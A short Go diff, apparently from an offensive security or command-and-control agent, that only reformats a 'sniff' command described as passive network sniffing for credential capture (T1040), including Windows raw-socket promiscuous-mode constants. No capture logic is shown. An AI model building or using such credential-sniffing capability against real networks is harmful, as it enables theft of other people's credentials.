@@ -17,18 +17,20 @@ import (
 
 type SniffCommand struct{}
 
-func (c *SniffCommand) Name() string        { return "sniff" }
-func (c *SniffCommand) Description() string { return "Passive network sniffing for credential capture (T1040)" }
+func (c *SniffCommand) Name() string { return "sniff" }
+func (c *SniffCommand) Description() string {
+	return "Passive network sniffing for credential capture (T1040)"
+}
 
 const (
-	sioRCVALL    = 0x98000001
-	rcvallOn     = 1
-	rcvallOff    = 0
-	ipprotoIP    = 0
-	sockRaw      = 3
-	afInet       = 2
-	solSocket    = 0xFFFF
-	soRCVTIMEO   = 0x1006
+	sioRCVALL  = 0x98000001
+	rcvallOn   = 1
+	rcvallOff  = 0
+	ipprotoIP  = 0
+	sockRaw    = 3
+	afInet     = 2
+	solSocket  = 0xFFFF
+	soRCVTIMEO = 0x1006
 )
 
 func (c *SniffCommand) Execute(task structs.Task) structs.CommandResult {
